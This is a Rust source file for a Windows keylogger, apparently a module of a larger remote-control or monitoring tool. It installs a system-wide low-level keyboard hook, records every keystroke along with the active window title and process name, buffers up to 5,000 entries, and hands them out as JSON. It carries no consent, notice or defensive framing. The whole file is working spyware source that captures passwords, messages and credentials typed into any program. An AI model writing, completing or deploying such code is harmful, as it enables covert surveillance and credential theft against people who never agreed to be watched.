use log::{info, error, debug};
use std::sync::{Arc, Mutex, atomic::{AtomicBool, Ordering}};
use std::collections::VecDeque;
use chrono::Local;
use serde::{Serialize, Deserialize};

const MAX_ENTRIES: usize = 5000;

#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct KeyEntry {
    pub timestamp: String,
    pub window_title: String,
    pub process_name: String,
    pub text: String,
}

struct BufferState {
    current_window: String,
    current_process: String,
    current_text: String,
    last_flush: std::time::Instant,
}

pub struct KeyLogger {
    entries: Arc<Mutex<VecDeque<KeyEntry>>>,
    is_running: Arc<AtomicBool>,
    buffer: Arc<Mutex<BufferState>>,
}

impl KeyLogger {
    pub fn new() -> Self {
        Self {
            entries: Arc::new(Mutex::new(VecDeque::new())),
            is_running: Arc::new(AtomicBool::new(false)),
            buffer: Arc::new(Mutex::new(BufferState {
                current_window: String::new(),
                current_process: String::new(),
                current_text: String::new(),
                last_flush: std::time::Instant::now(),
            })),
        }
    }

    pub async fn start(&self) -> Result<(), String> {
        if self.is_running.load(Ordering::SeqCst) {
            return Err("Keylogger already running".to_string());
        }
        self.is_running.store(true, Ordering::SeqCst);
        info!("Keylogger started");

        #[cfg(target_os = "windows")]
        {
            let entries = self.entries.clone();
            let running = self.is_running.clone();
            let buffer = self.buffer.clone();
            std::thread::spawn(move || {
                Self::run_windows_hook(entries, running, buffer);
            });
        }

        #[cfg(not(target_os = "windows"))]
        {
            info!("Keylogger: not on Windows, mock mode");
        }

        Ok(())
    }

    pub async fn stop(&self) -> Result<(), String> {
        if !self.is_running.load(Ordering::SeqCst) {
            return Err("Keylogger not running".to_string());
        }
        self.is_running.store(false, Ordering::SeqCst);
        // Flush remaining buffer
        self.flush_buffer();
        info!("Keylogger stopped");
        Ok(())
    }

    fn flush_buffer(&self) {
        if let Ok(mut buf) = self.buffer.lock() {
            if !buf.current_text.is_empty() {
                if let Ok(mut entries) = self.entries.lock() {
                    entries.push_back(KeyEntry {
                        timestamp: Local::now().format("%Y-%m-%d %H:%M:%S").to_string(),
                        window_title: buf.current_window.clone(),
                        process_name: buf.current_process.clone(),
                        text: buf.current_text.clone(),
                    });
                    if entries.len() > MAX_ENTRIES {
                        entries.pop_front();
                    }
                }
                buf.current_text.clear();
                buf.last_flush = std::time::Instant::now();
            }
        }
    }

    pub async fn get_logs_json(&self) -> Result<String, String> {
        // Flush current buffer first
        self.flush_buffer();
        let entries = self.entries.lock().map_err(|e| e.to_string())?;
        serde_json::to_string(&entries.iter().collect::<Vec<_>>()).map_err(|e| e.to_string())
    }

    pub async fn get_logs_count(&self) -> Result<usize, String> {
        let entries = self.entries.lock().map_err(|e| e.to_string())?;
        Ok(entries.len())
    }

    pub async fn clear_logs(&self) -> Result<usize, String> {
        let mut entries = self.entries.lock().map_err(|e| e.to_string())?;
        let count = entries.len();
        entries.clear();
        info!("Keylogger logs cleared ({} entries)", count);
        Ok(count)
    }

    #[cfg(target_os = "windows")]
    fn run_windows_hook(
        entries: Arc<Mutex<VecDeque<KeyEntry>>>,
        running: Arc<AtomicBool>,
        buffer: Arc<Mutex<BufferState>>,
    ) {
        use winapi::um::winuser::*;
        use winapi::shared::windef::HWND;
        use winapi::shared::minwindef::{WPARAM, LPARAM, LRESULT, HINSTANCE};
        use std::ptr;

        unsafe {
            // Thread-local storage for the hook callback
            thread_local! {
                static HOOK_DATA: std::cell::RefCell<Option<(
                    Arc<Mutex<VecDeque<KeyEntry>>>,
                    Arc<AtomicBool>,
                    Arc<Mutex<BufferState>>,
                )>> = std::cell::RefCell::new(None);
            }

            HOOK_DATA.with(|data| {
                *data.borrow_mut() = Some((entries.clone(), running.clone(), buffer.clone()));
            });

            unsafe extern "system" fn hook_proc(code: i32, w_param: WPARAM, l_param: LPARAM) -> LRESULT {
                if code >= 0 && (w_param as u32 == WM_KEYDOWN || w_param as u32 == WM_SYSKEYDOWN) {
                    let kb = &*(l_param as *const KBDLLHOOKSTRUCT);
                    let vk = kb.vkCode;

                    HOOK_DATA.with(|data| {
                        if let Some((ref entries, ref running, ref buffer)) = *data.borrow() {
                            if !running.load(Ordering::SeqCst) {
                                return;
                            }
                            process_key(vk, entries, buffer);
                        }
                    });
                }
                CallNextHookEx(ptr::null_mut(), code, w_param, l_param)
            }

            let hook = SetWindowsHookExW(
                WH_KEYBOARD_LL,
                Some(hook_proc),
                ptr::null_mut() as HINSTANCE,
                0,
            );

            if hook.is_null() {
                error!("Failed to set keyboard hook");
                return;
            }

            info!("Windows keyboard hook installed");

            // Message loop — required for low-level hooks
            let mut msg = std::mem::zeroed::<MSG>();
            while running.load(Ordering::SeqCst) {
                if PeekMessageW(&mut msg, ptr::null_mut(), 0, 0, PM_REMOVE) != 0 {
                    TranslateMessage(&msg);
                    DispatchMessageW(&msg);
                }
                std::thread::sleep(std::time::Duration::from_millis(10));

                // Periodic buffer flush (every 3 seconds of inactivity)
                if let Ok(buf) = buffer.lock() {
                    if !buf.current_text.is_empty()
                        && buf.last_flush.elapsed() > std::time::Duration::from_secs(3)
                    {
                        drop(buf);
                        flush_buffer_static(&entries, &buffer);
                    }
                }
            }

            UnhookWindowsHookEx(hook);
            info!("Windows keyboard hook removed");
        }
    }
}

#[cfg(target_os = "windows")]
fn get_foreground_window_info() -> (String, String) {
    use winapi::um::winuser::*;
    use winapi::um::processthreadsapi::OpenProcess;
    use winapi::um::psapi::GetModuleFileNameExW;
    use winapi::shared::minwindef::DWORD;

    unsafe {
        let hwnd = GetForegroundWindow();
        if hwnd.is_null() {
            return ("Unknown".into(), "unknown".into());
        }

        // Window title
        let mut title_buf = [0u16; 512];
        let len = GetWindowTextW(hwnd, title_buf.as_mut_ptr(), title_buf.len() as i32);
        let title = if len > 0 {
            String::from_utf16_lossy(&title_buf[..len as usize])
        } else {
            "Untitled".into()
        };

        // Process name
        let mut pid: DWORD = 0;
        GetWindowThreadProcessId(hwnd, &mut pid);
        let process_name = if pid != 0 {
            let handle = OpenProcess(0x0410, 0, pid); // PROCESS_QUERY_INFORMATION | PROCESS_VM_READ
            if !handle.is_null() {
                let mut name_buf = [0u16; 512];
                let name_len = GetModuleFileNameExW(handle, std::ptr::null_mut(), name_buf.as_mut_ptr(), 512);
                winapi::um::handleapi::CloseHandle(handle);
                if name_len > 0 {
                    let full = String::from_utf16_lossy(&name_buf[..name_len as usize]);
                    full.rsplit('\\').next().unwrap_or(&full).to_string()
                } else {
                    "unknown".into()
                }
            } else {
                "unknown".into()
            }
        } else {
            "unknown".into()
        };

        (title, process_name)
    }
}

#[cfg(target_os = "windows")]
fn vk_to_string(vk: u32) -> Option<String> {
    use winapi::um::winuser::*;
    match vk {
        0x08 => Some("[BS]".into()),
        0x09 => Some("\t".into()),
        0x0D => Some("\n".into()),
        0x1B => Some("[ESC]".into()),
        0x20 => Some(" ".into()),
        0x2E => Some("[DEL]".into()),
        // Arrow keys
        0x25 => Some("[LEFT]".into()),
        0x26 => Some("[UP]".into()),
        0x27 => Some("[RIGHT]".into()),
        0x28 => Some("[DOWN]".into()),
        // Modifier keys — skip
        0x10 | 0x11 | 0x12 | 0xA0..=0xA5 | 0x5B | 0x5C => None,
        // Caps lock, num lock etc
        0x14 | 0x90 | 0x91 => None,
        // F keys
        0x70..=0x87 => Some(format!("[F{}]", vk - 0x6F)),
        // Printable characters
        _ => {
            unsafe {
                let mut kbd_state = [0u8; 256];
                GetKeyboardState(kbd_state.as_mut_ptr());
                let scan = MapVirtualKeyW(vk, 0);
                let mut chars = [0u16; 4];
                let result = ToUnicode(vk, scan, kbd_state.as_ptr(), chars.as_mut_ptr(), 4, 0);
                if result > 0 {
                    Some(String::from_utf16_lossy(&chars[..result as usize]))
                } else {
                    None
                }
            }
        }
    }
}

#[cfg(target_os = "windows")]
fn process_key(
    vk: u32,
    entries: &Arc<Mutex<VecDeque<KeyEntry>>>,
    buffer: &Arc<Mutex<BufferState>>,
) {
    let key_str = match vk_to_string(vk) {
        Some(s) => s,
        None => return,
    };

    let (win_title, proc_name) = get_foreground_window_info();

    if let Ok(mut buf) = buffer.lock() {
        // If window changed, flush previous buffer
        if buf.current_window != win_title && !buf.current_text.is_empty() {
            if let Ok(mut entries) = entries.lock() {
                entries.push_back(KeyEntry {
                    timestamp: Local::now().format("%Y-%m-%d %H:%M:%S").to_string(),
                    window_title: buf.current_window.clone(),
                    process_name: buf.current_process.clone(),
                    text: buf.current_text.clone(),
                });
                if entries.len() > MAX_ENTRIES {
                    entries.pop_front();
                }
            }
            buf.current_text.clear();
        }

        buf.current_window = win_title;
        buf.current_process = proc_name;
        buf.current_text.push_str(&key_str);
        buf.last_flush = std::time::Instant::now();

        // Flush on Enter or if buffer gets long
        if key_str == "\n" || buf.current_text.len() > 200 {
            if let Ok(mut entries) = entries.lock() {
                entries.push_back(KeyEntry {
                    timestamp: Local::now().format("%Y-%m-%d %H:%M:%S").to_string(),
                    window_title: buf.current_window.clone(),
                    process_name: buf.current_process.clone(),
                    text: buf.current_text.clone(),
                });
                if entries.len() > MAX_ENTRIES {
                    entries.pop_front();
                }
            }
            buf.current_text.clear();
        }
    }
}

#[cfg(target_os = "windows")]
fn flush_buffer_static(
    entries: &Arc<Mutex<VecDeque<KeyEntry>>>,
    buffer: &Arc<Mutex<BufferState>>,
) {
    if let Ok(mut buf) = buffer.lock() {
        if !buf.current_text.is_empty() {
            if let Ok(mut entries) = entries.lock() {
                entries.push_back(KeyEntry {
                    timestamp: Local::now().format("%Y-%m-%d %H:%M:%S").to_string(),
                    window_title: buf.current_window.clone(),
                    process_name: buf.current_process.clone(),
                    text: buf.current_text.clone(),
                });
                if entries.len() > MAX_ENTRIES {
                    entries.pop_front();
                }
            }
            buf.current_text.clear();
            buf.last_flush = std::time::Instant::now();
        }
    }
}

impl Default for KeyLogger {
    fn default() -> Self {
        Self::new()
    }
}
